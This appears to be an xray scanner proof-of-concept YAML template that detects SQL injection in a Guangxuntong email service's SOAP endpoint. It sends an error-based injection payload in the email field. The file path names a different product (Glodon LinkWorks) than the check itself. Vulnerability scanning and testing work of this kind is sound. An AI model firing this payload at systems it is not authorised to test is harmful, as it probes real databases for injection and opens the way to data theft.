backend/utils/tools/xray_darwin_arm64/poc/chaitin/yaml-poc-glodon-linkworks-sql_injection-CT-845337.yml

name: poc-yaml-guangxuntong-emailaccountorguserservice-email-sqli
transport: http
set:
  s1: randomLowercase(8)
  s2: randomLowercase(10)
  s3: upper(s1) + ":" + upper(s2)
rules:
  r0:
    request:
      method: POST
      path: /Mail/Services/EmailAccountOrgUserService.asmx
      follow_redirects: false
      headers:
        Content-Type: text/xml; charset=utf-8
        SOAPAction: '"http://tempuri.org/GetUserInfosByEmail"'
      body: >-
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUserInfosByEmail xmlns="http://tempuri.org/">
              <email>string') and 1=concat('{{s1}}',':','{{s2}}')--</email>
            </GetUserInfosByEmail>
          </soap:Body>
        </soap:Envelope>
    expression: response.status == 500 && response.body_string.contains(s3) && response.body_string.contains("System.Data.SqlClient.SqlException:")
expression: r0()
detail:
  author: 2husky
  links:
    - http://www.exploit-db.com